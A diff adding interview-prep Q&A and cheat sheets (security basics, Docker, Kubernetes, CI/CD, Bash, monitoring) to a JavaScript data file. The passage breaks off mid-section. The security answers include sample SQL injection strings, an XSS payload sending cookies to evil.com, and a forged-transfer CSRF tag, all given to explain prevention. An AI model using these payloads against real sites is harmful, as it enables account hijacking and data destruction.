@@ -2998,6 +2998,249 @@ Sustainable on-call (from Google SRE book):
 
 Tools: PagerDuty, OpsGenie, Squadcast, Grafana OnCall — manage rotations and escalation policies`,
   },
+  {
+    id: 114, category: "Security", difficulty: "Medium",
+    q: "What is SQL injection and how do you prevent it?",
+    a: `SQL injection is when an attacker inserts malicious SQL code into an input field to manipulate the database query.
+
+Example — vulnerable code:
+query = "SELECT * FROM users WHERE username = '" + username + "'"
+
+If username = "admin' OR '1'='1" the query becomes:
+SELECT * FROM users WHERE username = 'admin' OR '1'='1'
+→ Returns ALL users — authentication bypassed
+
+Worse example — data destruction:
+username = "'; DROP TABLE users; --"
+
+PREVENTION:
+1. Parameterized queries / prepared statements (PRIMARY FIX):
+   cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
+   Never concatenate user input into SQL strings
+
+2. ORM (Object-Relational Mapper):
+   User.objects.filter(username=username)  # Django — safe by default
+   db.query(User).filter_by(username=username)  # SQLAlchemy
+
+3. Input validation — whitelist expected formats
+4. Least privilege — DB user should only have SELECT/INSERT, not DROP
+5. WAF (Web Application Firewall) — blocks common SQLi patterns
+
+Testing: sqlmap tool, OWASP ZAP, manual ' OR 1=1 -- tests`,
+  },
+  {
+    id: 115, category: "Security", difficulty: "Medium",
+    q: "What is XSS (Cross-Site Scripting) and how do you prevent it?",
+    a: `XSS is when an attacker injects malicious JavaScript into a web page that other users view.
+
+TYPES:
+Stored XSS   — malicious script saved to DB, served to all visitors
+              Example: forum post containing <script>steal_cookies()</script>
+
+Reflected XSS — script in URL parameter, reflected back in response
+              Example: search?q=<script>document.location='evil.com?c='+document.cookie</script>
+
+DOM-based XSS — client-side JS reads attacker-controlled data and writes it to the DOM
+
+IMPACT:
+• Steal session cookies → hijack user accounts
+• Keylog form inputs (passwords, credit cards)
+• Redirect users to phishing sites
+• Deface website
+
+PREVENTION:
+1. Output encoding — encode < > " ' & before rendering in HTML
+   &lt; &gt; &quot; &#x27; &amp;
+   Framework default: React escapes by default (dangerouslySetInnerHTML is dangerous!)
+
+2. Content Security Policy (CSP) header:
+   Content-Security-Policy: default-src 'self'; script-src 'self'
+   Blocks inline scripts and external script sources
+
+3. HttpOnly cookie flag — prevents JavaScript from reading cookies:
+   Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
+
+4. Input validation — reject unexpected characters
+5. Use modern frameworks — React, Vue, Angular escape by default`,
+  },
+  {
+    id: 116, category: "Security", difficulty: "Medium",
+    q: "What is CSRF and how do you prevent it?",
+    a: `CSRF (Cross-Site Request Forgery) — tricks a logged-in user's browser into making unwanted requests to a site they're authenticated on.
+
+Example attack:
+1. User logs into bank.com — session cookie stored in browser
+2. User visits evil.com which contains:
+   <img src="https://bank.com/transfer?to=attacker&amount=5000">
+3. Browser automatically sends the request WITH the session cookie
+4. Bank executes the transfer — user never clicked anything
+
+PREVENTION:
+1. CSRF Tokens (primary defense):
+   • Server generates random token per session
+   • Token included in every form as hidden field
+   • Server validates token on every state-changing request
+   • Attacker doesn't know the token → request rejected
+
+2. SameSite cookie attribute:
+   Set-Cookie: session=abc; SameSite=Strict
+   • Strict: cookie never sent on cross-site requests
+   • Lax: sent on top-level navigation only (good default)
+
+3. Check Origin/Referer header:
+   • Reject requests where Origin doesn't match your domain
+
+4. Double submit cookie pattern:
+   • Send CSRF token in both cookie and request body
+   • Attacker can't read cookie from another domain
+
+Note: GET requests should NEVER modify state — only POST/PUT/DELETE`,
+  },
+  {
+    id: 117, category: "Security", difficulty: "Hard",
+    q: "What is the OWASP Top 10 and why does it matter?",
+    a: `OWASP Top 10 is the most critical web application security risks, updated every few years by the Open Web Application Security Project.
+
+OWASP TOP 10 (2021):
+A01 Broken Access Control    — users accessing data/actions they shouldn't
+A02 Cryptographic Failures   — weak/missing encryption (plain text passwords, HTTP)
+A03 Injection                — SQL, NoSQL, LDAP, OS command injection
+A04 Insecure Design          — missing security controls in architecture
+A05 Security Misconfiguration— default passwords, open cloud storage, verbose errors
+A06 Vulnerable Components    — outdated libraries with known CVEs (log4shell, etc.)
+A07 Auth Failures            — weak passwords, no MFA, session fixation
+A08 Software/Data Integrity  — unverified updates, insecure CI/CD pipelines
+A09 Logging Failures         — not logging security events, logs not monitored
+A10 SSRF                     — server makes requests to internal resources on attacker's behalf
+
+WHY IT MATTERS:
+• Industry standard for security assessments and pentests
+• Compliance frameworks (PCI-DSS, SOC2) reference it
+• Security interviews frequently ask about it
+• Most real-world breaches trace back to one of these 10
+
+QUICK WINS TO COVER MOST RISKS:
+• Parameterized queries → prevents A03
+• Keep dependencies updated → prevents A06
+• Enable MFA → prevents A07
+• Use HTTPS everywhere → prevents A02
+• Principle of least privilege → prevents A01`,
+  },
+  {
+    id: 118, category: "Security", difficulty: "Medium",
+    q: "What is the principle of least privilege and how do you apply it?",
+    a: `Principle of Least Privilege (PoLP): every user, process, and system should have only the minimum access needed to do its job — nothing more.
+
+WHY IT MATTERS:
+• Limits blast radius if an account is compromised
+• Reduces insider threat risk
+• Makes audit trails more meaningful
+• Required by most compliance frameworks (SOC2, ISO27001, PCI-DSS)
+
+APPLICATIONS:
+
+Linux/servers:
+• Don't run apps as root — create dedicated service accounts
+• File permissions: 644 for files, 755 for dirs (not 777)
+• sudo: grant specific commands only (NOPASSWD: /bin/systemctl restart nginx)
+
+Active Directory:
+• Users get standard accounts + separate admin account
+• Admin accounts only used when needed, not for email/browsing
+• Service accounts get only the permissions they need
+
+Cloud (IAM):
+• No primitive roles (Owner/Editor) in production
+• Use predefined roles (roles/storage.objectViewer)
+• Service accounts per application, not shared
+• Regularly audit and remove unused permissions
+
+Kubernetes:
+• RBAC: create Roles scoped to specific namespaces
+• Avoid ClusterAdmin for regular workloads
+• Service accounts per deployment
+
+Database:
+• App DB user: SELECT, INSERT, UPDATE only
+• Never give app user DROP, CREATE, or GRANT privileges
+• Separate read-only replica user for reporting queries`,
+  },
+  {
+    id: 119, category: "Security", difficulty: "Medium",
+    q: "What is a firewall and what are the differences between stateful and stateless firewalls?",
+    a: `A firewall controls network traffic by allowing or blocking packets based on defined rules.
+
+STATELESS FIREWALL:
+• Examines each packet in isolation
+• Rules based on: source IP, dest IP, port, protocol
+• Does NOT track connection state
+• Fast, simple, low overhead
+• Examples: basic ACLs on routers, AWS NACLs
+
+STATEFUL FIREWALL:
+• Tracks the STATE of active connections
+• Knows if a packet is part of an established connection
+• Automatically allows return traffic for outbound connections
+• More intelligent, catches more attack types
+• Examples: AWS Security Groups, Windows Firewall, iptables with conntrack
+
+Example difference:
+Stateless: You need explicit rules for BOTH outbound and return traffic
+Stateful:  Allow outbound 443 → return traffic automatically allowed
+
+TYPES:
+Packet filter    — Layer 3/4, IP/port based (stateless)
+Stateful         — tracks TCP connection state
+Application (L7) — understands HTTP/DNS/etc, blocks based on content
+WAF              — specializes in web app traffic (HTTP)
+NGFW             — combines all of the above (Palo Alto, Fortinet)
+
+iptables (Linux) basics:
+iptables -A INPUT -p tcp --dport 22 -j ACCEPT    Allow SSH
+iptables -A INPUT -j DROP                         Drop everything else`,
+  },
+  {
+    id: 120, category: "Security", difficulty: "Hard",
+    q: "What is a penetration test and what are the main phases?",
+    a: `Penetration testing (pentesting) = authorized simulated attack on a system to find vulnerabilities before real attackers do.
+
+KEY DISTINCTION:
+• Pentest = authorized, legal, scoped, documented
+• Hacking = unauthorized — even well-intentioned is illegal
+• Always get written authorization (Rules of Engagement) before testing
+
+PENTEST PHASES (PTES standard):
+1. Pre-engagement
+   • Define scope (what systems, what's out of bounds)
+   • Rules of engagement (hours allowed, can you use DoS?)
+   • Get written authorization signed
+
+2. Reconnaissance (OSINT)
+   • Passive: LinkedIn, DNS records, Shodan, job listings
+   • Active: port scans, service enumeration
+   • Tools: nmap, theHarvester, Shodan, whois
+
+3. Scanning & Enumeration
+   • nmap -sV -sC target    Service versions + default scripts
+   • Identify OS, open ports, running services, software versions
+   • Check for known CVEs on discovered versions
+
+4. Exploitation
+   • Try to exploit discovered vulnerabilities
+   • Tools: Metasploit, manual exploits, custom scripts
+   • Goal: gain access — not cause damage
+
+5. Post-Exploitation
+   • What can you do with access? (privilege escalation, lateral movement)
+   • Assess real business impact
+
+6. Reporting
+   • Document every finding with: severity, evidence, reproduction steps
+   • Include remediation recommendations
+   • Executive summary + technical details
+
+TYPES: Black box (no info), White box (full info), Gray box (partial)`,
+  },
 ];
 
 // ── CHEAT SHEETS ──────────────────────────────────────────────────────────────
@@ -3566,6 +3809,1016 @@ Get-VM "VMName" | New-Snapshot -Name "Pre-Patch-$(Get-Date -Format yyyyMMdd)"`
     ]
   },
   {
+    id: "docker",
+    title: "Docker",
+    emoji: "🐋",
+    sections: [
+      {
+        title: "Core Concepts",
+        content: `Image      — read-only blueprint (layers stacked on base OS)
+Container  — running instance of an image (isolated process)
+Registry   — server that stores/distributes images (Docker Hub, GCR)
+Volume     — persistent storage that survives container removal
+Network    — virtual network connecting containers
+
+Key difference from VMs:
+• VM: full OS per machine (GBs, minutes to start)
+• Container: shares host kernel, just app + deps (MBs, seconds to start)
+
+Image layers are cached — only changed layers rebuild on docker build`
+      },
+      {
+        title: "Essential Commands",
+        content: `IMAGES:
+docker pull nginx:latest           Download image
+docker images                      List local images
+docker rmi nginx:latest            Remove image
+docker build -t myapp:v1 .         Build from Dockerfile in current dir
+docker tag myapp:v1 user/myapp:v1  Tag for pushing
+
+CONTAINERS:
+docker run -d -p 8080:80 nginx     Run detached, map port 8080→80
+docker run -it ubuntu bash         Interactive shell
+docker ps                          Running containers
+docker ps -a                       All containers (including stopped)
+docker stop <id>                   Graceful stop (SIGTERM)
+docker rm <id>                     Remove stopped container
+docker exec -it <id> bash          Shell into running container
+docker logs <id>                   View container logs
+docker logs -f <id>                Follow logs live
+
+CLEANUP:
+docker system prune                Remove stopped containers + dangling images
+docker system prune -af            Remove ALL unused resources (careful in prod!)`
+      },
+      {
+        title: "Dockerfile Reference",
+        content: `FROM node:20-alpine          Base image (always first)
+WORKDIR /app                 Set working directory
+COPY package*.json ./        Copy specific files first (layer cache!)
+RUN npm install              Run during BUILD
+COPY . .                     Copy rest of source
+EXPOSE 3000                  Document port (doesn't actually open it)
+ENV NODE_ENV=production      Set environment variable
+CMD ["node", "server.js"]    Default command at runtime
+
+Build cache tip:
+• Copy package.json BEFORE copying source code
+• npm install only re-runs when package.json changes
+• Source code changes don't invalidate the npm install layer
+
+Multi-stage build (keeps final image small):
+FROM node:20 AS builder
+WORKDIR /app
+COPY . .
+RUN npm run build
+
+FROM nginx:alpine
+COPY --from=builder /app/build /usr/share/nginx/html`
+      },
+      {
+        title: "Docker Compose",
+        content: `docker-compose.yml — defines multi-container apps
+
+version: "3.9"
+services:
+  web:
+    build: .
+    ports:
+      - "3000:3000"
+    environment:
+      - NODE_ENV=production
+    depends_on:
+      - db
+    volumes:
+      - ./logs:/app/logs
+
+  db:
+    image: postgres:15
+    environment:
+      POSTGRES_PASSWORD: secret
+    volumes:
+      - pgdata:/var/lib/postgresql/data
+
+volumes:
+  pgdata:
+
+COMMANDS:
+docker compose up -d          Start all services detached
+docker compose down           Stop + remove containers
+docker compose down -v        Also remove volumes
+docker compose logs -f web    Follow logs for web service
+docker compose ps             Status of all services
+docker compose exec web bash  Shell into service`
+      },
+      {
+        title: "Volumes & Persistence",
+        content: `Problem: containers are ephemeral — data lost on removal
+
+NAMED VOLUMES (preferred for databases):
+docker run -v pgdata:/var/lib/postgresql/data postgres
+• Managed by Docker (/var/lib/docker/volumes/)
+• Survives container removal
+• Easy to backup and migrate
+
+BIND MOUNTS (preferred for development):
+docker run -v /host/path:/container/path nginx
+• Direct link to host filesystem
+• Changes reflect immediately (great for dev)
+• Not portable across machines
+
+TMPFS (in-memory, non-persistent):
+docker run --tmpfs /tmp nginx
+• Fast, stored in RAM only
+• Good for sensitive temp data
+
+Rule: ALWAYS use named volumes for database containers`
+      },
+      {
+        title: "Networking",
+        content: `NETWORK TYPES:
+bridge    Default — containers on same bridge can talk by name
+host      Container shares host network stack (no isolation)
+none      No networking
+overlay   Multi-host networking (Docker Swarm/K8s)
+
+Docker Compose creates a default bridge network automatically.
+Services reach each other by service name:
+  web service can connect to db:5432 (not localhost:5432)
+
+COMMANDS:
+docker network ls                    List networks
+docker network create mynet          Create bridge network
+docker network inspect mynet        Details + connected containers
+docker run --network mynet myapp     Run container on specific network
+
+Port mapping:
+-p 8080:80   host_port:container_port
+-p 80        Random host port → container port 80`
+      },
+    ]
+  },
+  {
+    id: "kubernetes",
+    title: "Kubernetes",
+    emoji: "⚓",
+    sections: [
+      {
+        title: "Core Concepts",
+        content: `Kubernetes (K8s) — container orchestration platform
+
+CONTROL PLANE:
+API Server     — entry point for all kubectl commands
+etcd           — distributed key-value store (cluster state)
+Scheduler      — decides which node a pod runs on
+Controller Mgr — maintains desired state (restarts failed pods)
+
+WORKER NODES:
+kubelet        — agent on each node, talks to API server
+kube-proxy     — manages network rules for services
+Container RT   — Docker/containerd actually runs containers
+
+KEY OBJECTS:
+Pod            — smallest deployable unit (1+ containers)
+Deployment     — manages pod replicas + rolling updates
+Service        — stable network endpoint for pods
+ConfigMap      — non-sensitive config data
+Secret         — sensitive data (base64 encoded)
+Namespace      — virtual cluster isolation
+Ingress        — HTTP routing rules (external → services)`
+      },
+      {
+        title: "kubectl Cheat Sheet",
+        content: `CONTEXT / CLUSTER:
+kubectl config get-contexts          List contexts
+kubectl config use-context prod      Switch cluster
+kubectl config current-context       Active context
+
+PODS:
+kubectl get pods                     List pods
+kubectl get pods -n kube-system      In specific namespace
+kubectl describe pod <name>          Full details + events
+kubectl logs <pod>                   Container logs
+kubectl logs -f <pod>                Follow live
+kubectl exec -it <pod> -- bash       Shell into pod
+kubectl delete pod <name>            Delete (Deployment recreates it)
+
+DEPLOYMENTS:
+kubectl get deployments
+kubectl rollout status deploy/myapp
+kubectl rollout undo deploy/myapp    Rollback
+kubectl scale deploy/myapp --replicas=5
+kubectl set image deploy/myapp app=myapp:v2   Update image
+
+APPLY / DELETE:
+kubectl apply -f manifest.yaml       Create or update
+kubectl delete -f manifest.yaml      Delete from file
+kubectl diff -f manifest.yaml        Preview changes`
+      },
+      {
+        title: "Deployments & ReplicaSets",
+        content: `Deployment manages ReplicaSet which manages Pods
+
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: myapp
+spec:
+  replicas: 3
+  selector:
+    matchLabels:
+      app: myapp
+  template:
+    metadata:
+      labels:
+        app: myapp
+    spec:
+      containers:
+      - name: app
+        image: myapp:v1
+        ports:
+        - containerPort: 3000
+        resources:
+          requests:
+            cpu: "100m"
+            memory: "128Mi"
+          limits:
+            cpu: "500m"
+            memory: "512Mi"
+
+Rolling update strategy (default):
+• New pods come up before old ones go down
+• maxSurge: 1 extra pod during update
+• maxUnavailable: 0 (no downtime)`
+      },
+      {
+        title: "Services & Ingress",
+        content: `SERVICE TYPES:
+ClusterIP   — internal only (default), stable IP inside cluster
+NodePort    — exposes on each node's IP at static port (30000-32767)
+LoadBalancer — provisions cloud load balancer (GKE/EKS/AKS)
+ExternalName — DNS alias to external service
+
+Service YAML:
+apiVersion: v1
+kind: Service
+metadata:
+  name: myapp-svc
+spec:
+  selector:
+    app: myapp          # matches pod labels
+  ports:
+  - port: 80            # service port
+    targetPort: 3000    # pod port
+  type: ClusterIP
+
+INGRESS (HTTP routing):
+apiVersion: networking.k8s.io/v1
+kind: Ingress
+metadata:
+  name: myapp-ingress
+spec:
+  rules:
+  - host: myapp.example.com
+    http:
+      paths:
+      - path: /
+        pathType: Prefix
+        backend:
+          service:
+            name: myapp-svc
+            port:
+              number: 80`
+      },
+      {
+        title: "ConfigMaps & Secrets",
+        content: `ConfigMap — non-sensitive config (env vars, config files)
+Secret     — sensitive data (passwords, tokens, keys) — base64 encoded
+
+CREATE:
+kubectl create configmap app-config --from-literal=ENV=prod
+kubectl create secret generic db-secret --from-literal=password=s3cr3t
+
+USE IN POD (env vars):
+env:
+- name: DB_PASSWORD
+  valueFrom:
+    secretKeyRef:
+      name: db-secret
+      key: password
+- name: APP_ENV
+  valueFrom:
+    configMapKeyRef:
+      name: app-config
+      key: ENV
+
+USE IN POD (mounted as file):
+volumes:
+- name: config-vol
+  configMap:
+    name: app-config
+volumeMounts:
+- name: config-vol
+  mountPath: /etc/config
+
+⚠️ Secrets are base64 encoded, NOT encrypted by default
+Use Sealed Secrets or External Secrets Operator for production`
+      },
+      {
+        title: "Troubleshooting Pods",
+        content: `COMMON STATES:
+Pending         — scheduler can't place it (resource constraints, no nodes)
+CrashLoopBackOff — container crashes repeatedly (check logs!)
+ImagePullBackOff — can't pull image (wrong name, no registry auth)
+OOMKilled       — container exceeded memory limit
+Terminating     — stuck deleting (finalizer issue)
+
+DEBUGGING STEPS:
+1. kubectl describe pod <name>   → check Events section at bottom
+2. kubectl logs <pod>            → app error output
+3. kubectl logs <pod> --previous → logs from crashed container
+4. kubectl exec -it <pod> -- sh  → get inside and inspect
+
+CrashLoopBackOff checklist:
+• App crashes on startup (check logs for errors)
+• Wrong env vars / missing secrets
+• Bad command/args in container spec
+• Missing files or config the app expects
+
+ImagePullBackOff checklist:
+• Image name/tag typo
+• Private registry → need imagePullSecret
+• Registry rate limit (Docker Hub)`
+      },
+    ]
+  },
+  {
+    id: "cicd",
+    title: "CI/CD",
+    emoji: "🔄",
+    sections: [
+      {
+        title: "CI/CD Concepts",
+        content: `CI — Continuous Integration
+• Developers merge code frequently (at least daily)
+• Every push triggers automated: build → test → lint
+• Goal: catch bugs early, before they reach prod
+
+CD — Continuous Delivery
+• Every passing build is ready to deploy (one-click deploy)
+• Automated deployment to staging, manual approval for prod
+
+CD — Continuous Deployment
+• Every passing build deploys to production automatically
+• No human gate — full automation
+
+Pipeline stages (typical):
+1. Trigger (push, PR, schedule)
+2. Build (compile, docker build)
+3. Test (unit, integration, e2e)
+4. Security scan (SAST, dependency audit)
+5. Push artifact (docker push, npm publish)
+6. Deploy to staging (auto)
+7. Deploy to production (manual approval or auto)
+
+Benefits:
+• Smaller, safer releases (easier to rollback)
+• Faster feedback loop
+• Less manual work = fewer human errors`
+      },
+      {
+        title: "GitHub Actions",
+        content: `Workflows live in .github/workflows/*.yml
+
+TRIGGERS:
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+  schedule:
+    - cron: '0 2 * * *'    # 2am daily
+  workflow_dispatch:        # manual trigger
+
+BASIC STRUCTURE:
+name: CI
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+      - run: npm ci
+      - run: npm test
+      - run: npm run build
+
+KEY CONCEPTS:
+• jobs run in parallel by default
+• steps within a job run sequentially
+• needs: [build] makes a job wait for another
+• matrix: test on multiple OS/versions simultaneously
+• Secrets: stored in repo Settings → never in YAML`
+      },
+      {
+        title: "Docker in CI/CD",
+        content: `Full pipeline with Docker Hub push:
+
+name: Build and Push
+on:
+  push:
+    branches: [main]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Set up Docker Buildx
+        uses: docker/setup-buildx-action@v3
+
+      - name: Log in to Docker Hub
+        uses: docker/login-action@v3
+        with:
+          username: \${{ secrets.DOCKERHUB_USERNAME }}
+          password: \${{ secrets.DOCKERHUB_TOKEN }}
+
+      - name: Build and push
+        uses: docker/build-push-action@v5
+        with:
+          context: .
+          push: true
+          tags: |
+            user/myapp:latest
+            user/myapp:\${{ github.sha }}
+          cache-from: type=gha
+          cache-to: type=gha,mode=max
+
+Best practices:
+• Use commit SHA as image tag for traceability
+• Cache layers with type=gha for faster builds
+• Store credentials in GitHub Secrets, never in YAML`
+      },
+      {
+        title: "Secrets & Environments",
+        content: `SECRETS:
+• Encrypted key-value pairs, never visible in logs
+• Set in: Repository → Settings → Secrets and variables → Actions
+• Referenced as: \${{ secrets.MY_SECRET }}
+• Automatically masked (shown as ***) in logs
+
+SECRET TYPES:
+Repository secrets   — available to all workflows in repo
+Organization secrets — shareable across repos in org
+Environment secrets  — scoped to specific deployment environment
+
+ENVIRONMENTS:
+• Named targets: staging, production, dev
+• Can require human approval before deploy
+• Can restrict to specific branches (only main → prod)
+• Each environment has its own secrets
+
+Example deployment gate:
+jobs:
+  deploy-prod:
+    environment: production    # triggers approval requirement
+    runs-on: ubuntu-latest
+    steps:
+      - run: ./deploy.sh
+
+OIDC (recommended over stored credentials):
+• GitHub requests short-lived token from GCP/AWS
+• No long-lived secrets stored in GitHub
+• Supported by google-github-actions/auth
+  and aws-actions/configure-aws-credentials`
+      },
+      {
+        title: "GitOps",
+        content: `GitOps = Git as the single source of truth for infrastructure
+
+HOW IT WORKS:
+1. Developer pushes code to Git
+2. CI pipeline builds + pushes new Docker image
+3. CI updates Kubernetes manifests in Git (new image tag)
+4. GitOps controller (ArgoCD/Flux) detects Git change
+5. Controller syncs cluster to match Git state
+6. Cluster updated — no direct kubectl apply needed
+
+BENEFITS:
+• Full audit trail — every change is a Git commit
+• Easy rollback — git revert
+• Consistent environments — cluster always matches Git
+• Separation of concerns — app devs don't need cluster access
+
+TOOLS:
+ArgoCD   — popular, web UI, good for teams
+Flux CD  — lightweight, strong Helm support, CLI-focused
+
+ARGOCD CONCEPTS:
+Application  — links a Git repo/path to a K8s cluster/namespace
+Sync         — apply Git state to cluster
+Health       — monitors resource health
+Auto-sync    — automatically sync when Git changes`
+      },
+    ]
+  },
+  {
+    id: "bash",
+    title: "Bash",
+    emoji: "💻",
+    sections: [
+      {
+        title: "Script Basics",
+        content: `#!/bin/bash              Shebang — always first line
+set -e                   Exit immediately on error
+set -u                   Error on undefined variables
+set -o pipefail          Pipeline fails if any command fails
+set -euo pipefail        All three combined — use this always
+
+VARIABLES:
+NAME="garry"             Assign (no spaces around =)
+echo "$NAME"             Use (always quote variables!)
+echo "\${NAME}world"      Curly braces for disambiguation
+readonly PI=3.14         Constant
+unset NAME               Delete variable
+
+SPECIAL VARIABLES:
+\$0    Script name
+\$1-\$9  Positional arguments
+\$@    All arguments (as separate words)
+\$#    Number of arguments
+\$?    Exit code of last command (0=success)
+\$\$    PID of current script
+\$!    PID of last background command
+
+QUOTES:
+"double"  — expands variables and \$() inside
+'single'  — literal, no expansion
+\`backtick\`  — command substitution (use \$() instead)`
+      },
+      {
+        title: "Conditionals & Loops",
+        content: `IF/ELSE:
+if [ "\$USER" = "root" ]; then
+  echo "Running as root"
+elif [ "\$1" = "--help" ]; then
+  echo "Usage: script.sh"
+else
+  echo "Normal user"
+fi
+
+TEST CONDITIONS:
+[ -f file ]     File exists and is regular file
+[ -d dir ]      Directory exists
+[ -z "\$var" ]   String is empty
+[ -n "\$var" ]   String is not empty
+[ "\$a" = "\$b" ]  Strings equal
+[ "\$a" != "\$b" ] Strings not equal
+[ \$n -eq 5 ]   Numbers equal (-ne -lt -le -gt -ge)
+
+FOR LOOPS:
+for i in 1 2 3 4 5; do echo \$i; done
+for file in /var/log/*.log; do echo "\$file"; done
+for i in \$(seq 1 10); do echo \$i; done
+
+WHILE LOOP:
+while [ \$COUNT -lt 10 ]; do
+  echo \$COUNT
+  COUNT=\$((COUNT + 1))
+done
+
+CASE:
+case "\$1" in
+  start)  systemctl start nginx ;;
+  stop)   systemctl stop nginx ;;
+  *)      echo "Usage: \$0 start|stop" ;;
+esac`
+      },
+      {
+        title: "Functions",
+        content: `DEFINING:
+log() {
+  echo "[\$(date '+%Y-%m-%d %H:%M:%S')] \$*" | tee -a "\$LOG_FILE"
+}
+
+check_root() {
+  if [ "\$(id -u)" -ne 0 ]; then
+    echo "ERROR: Must run as root" >&2
+    exit 1
+  fi
+}
+
+CALLING:
+log "Starting backup"
+check_root
+
+RETURN VALUES:
+• Functions return exit codes (0=success, 1-255=error)
+• Return a value via echo + capture:
+
+get_ip() {
+  hostname -I | awk '{print \$1}'
+}
+MY_IP=\$(get_ip)
+
+LOCAL VARIABLES (always use local inside functions!):
+process_file() {
+  local file="\$1"
+  local count=0
+  # ...
+}
+
+ARGUMENTS IN FUNCTIONS:
+\$1, \$2  — arguments passed to the function
+"\$@"    — all arguments`
+      },
+      {
+        title: "Text Processing",
+        content: `GREP — search/filter:
+grep "error" /var/log/syslog          Lines containing "error"
+grep -i "error" file                  Case-insensitive
+grep -v "debug" file                  Invert match
+grep -r "TODO" /app/src/              Recursive search
+grep -E "error|warn|crit" file        Multiple patterns (OR)
+grep -A 3 "Exception" file            3 lines AFTER match
+grep -B 2 "Exception" file            2 lines BEFORE match
+
+AWK — field extraction:
+awk '{print \$1}' file                 First field
+awk -F: '{print \$1, \$3}' /etc/passwd  Colon delimiter
+awk '\$3 > 1000 {print \$1}' /etc/passwd  Conditional
+df -h | awk 'NR>1 {print \$5, \$6}'    Skip header row
+
+SED — find/replace:
+sed 's/foo/bar/' file                 Replace first per line
+sed 's/foo/bar/g' file                Replace all
+sed -i 's/old/new/g' config           Edit file in-place
+sed '/^#/d' file                      Delete comment lines
+sed -n '10,20p' file                  Print only lines 10-20
+
+USEFUL PIPELINES:
+cat access.log | awk '{print \$1}' | sort | uniq -c | sort -rn | head -10
+# Top 10 IP addresses hitting your web server`
+      },
+      {
+        title: "Common Patterns",
+        content: `CHECK IF ROOT:
+if [ "\$(id -u)" -ne 0 ]; then echo "Run as root"; exit 1; fi
+
+CHECK COMMAND EXISTS:
+if ! command -v docker &>/dev/null; then
+  echo "docker not installed"; exit 1
+fi
+
+LOCK FILE (prevent duplicate runs):
+LOCKFILE="/tmp/\$(basename \$0).lock"
+if [ -f "\$LOCKFILE" ]; then echo "Already running"; exit 1; fi
+touch "\$LOCKFILE"
+trap "rm -f \$LOCKFILE" EXIT   # cleanup on exit
+
+REDIRECT OUTPUT:
+command > output.txt         Stdout to file (overwrite)
+command >> output.txt        Stdout append
+command 2> error.txt         Stderr to file
+command &> both.txt          Both stdout and stderr
+command 2>/dev/null          Suppress errors
+command > /dev/null 2>&1     Suppress everything
+
+ARITHMETIC:
+result=\$((5 + 3 * 2))
+count=\$((count + 1))
+
+CHECK EXIT CODE:
+if ! rsync -av /src/ /backup/; then
+  echo "rsync failed!" >&2; exit 1
+fi`
+      },
+    ]
+  },
+  {
+    id: "monitoring",
+    title: "Monitoring",
+    emoji: "📊",
+    sections: [
+      {
+        title: "Observability: The 3 Pillars",
+        content: `METRICS — numeric measurements over time
+• CPU %, memory usage, request rate, error rate, latency
+• Tools: Prometheus, Datadog, CloudWatch
+• Answer: "Is my system healthy RIGHT NOW?"
+
+LOGS — timestamped text records of events
+• App logs, access logs, error logs, audit logs
+• Tools: ELK Stack, Loki, Splunk, Cloud Logging
+• Answer: "WHAT happened and WHEN?"
+
+TRACES — end-to-end journey of a request
+• Track one request across multiple microservices
+• Tools: Jaeger, Zipkin, Cloud Trace, Datadog APM
+• Answer: "WHERE is the slowness coming from?"
+
+WHY ALL THREE:
+• Metrics tell you SOMETHING is wrong (error rate up)
+• Logs tell you WHAT went wrong (exception message)
+• Traces tell you WHERE it started (which service, which call)
+
+SLI / SLO / SLA:
+SLI  — actual measured metric (e.g. 99.95% uptime this month)
+SLO  — internal target you set (e.g. 99.9% uptime)
+SLA  — contractual commitment to customers (e.g. 99.5% uptime)`
+      },
+      {
+        title: "Prometheus",
+        content: `Prometheus — open-source metrics monitoring (pull-based)
+
+HOW IT WORKS:
+1. Targets expose /metrics endpoint (HTTP)
+2. Prometheus scrapes them on schedule (default: 15s)
+3. Stores as time-series data
+4. Alertmanager handles alert routing
+5. Grafana visualizes the data
+
+prometheus.yml CONFIG:
+global:
+  scrape_interval: 15s
+scrape_configs:
+  - job_name: 'myapp'
+    static_configs:
+      - targets: ['localhost:3000']
+
+PROMQL BASICS:
+up                                    Is target up? (1=yes 0=no)
+http_requests_total                   Total request count
+rate(http_requests_total[5m])         Requests per second (5m window)
+sum(rate(http_requests_total[5m]))    Total across all instances
+histogram_quantile(0.99, ...)         99th percentile latency
+
+METRIC TYPES:
+Counter    — always increases (requests, errors)
+Gauge      — can go up/down (CPU%, memory, connections)
+Histogram  — distribution of values (request duration buckets)
+Summary    — similar to histogram, client-side quantiles`
+      },
+      {
+        title: "Grafana",
+        content: `Grafana — visualization and dashboarding platform
+
+KEY CONCEPTS:
+Data Source  — connection to Prometheus, Loki, etc.
+Dashboard    — collection of panels
+Panel        — single visualization (graph, stat, table, gauge)
+Alert        — fires when a metric crosses a threshold
+
+COMMON DASHBOARD PANELS:
+Time series  — line/bar chart over time (CPU, memory, requests)
+Stat         — single big number (current value)
+Gauge        — circular indicator (% full)
+Table        — tabular data
+Logs         — log stream (Loki source)
+Heatmap      — latency distribution over time
+
+VARIABLES (make dashboards dynamic):
+$namespace   — dropdown to filter by K8s namespace
+$instance    — dropdown to select specific host
+Used in queries: rate(http_requests_total{instance=~"$instance"}[5m])
+
+ALERTING:
+• Set threshold on any panel
+• Route to Slack, PagerDuty, email via contact points
+• Silence alerts during maintenance windows
+
+kube-prometheus-stack — Helm chart that installs:
+Prometheus + Grafana + Alertmanager + node-exporter + kube-state-metrics`
+      },
+      {
+        title: "Logging (ELK / Loki)",
+        content: `ELK STACK:
+Elasticsearch  — distributed search + analytics engine (stores logs)
+Logstash       — log pipeline: ingest → transform → output
+Kibana         — visualization UI for Elasticsearch
+Beats          — lightweight shippers (Filebeat, Metricbeat)
+
+Flow: App → Filebeat → Logstash → Elasticsearch → Kibana
+
+GCP EQUIVALENT:
+Cloud Logging (Stackdriver) — auto-collects GKE logs
+Log Explorer — query with MQL/SQL-like syntax
+Log-based metrics — create Prometheus metrics from log patterns
+Log sinks — export to BigQuery, Pub/Sub, GCS
+
+LOKI (lightweight alternative):
+• Like Prometheus but for logs
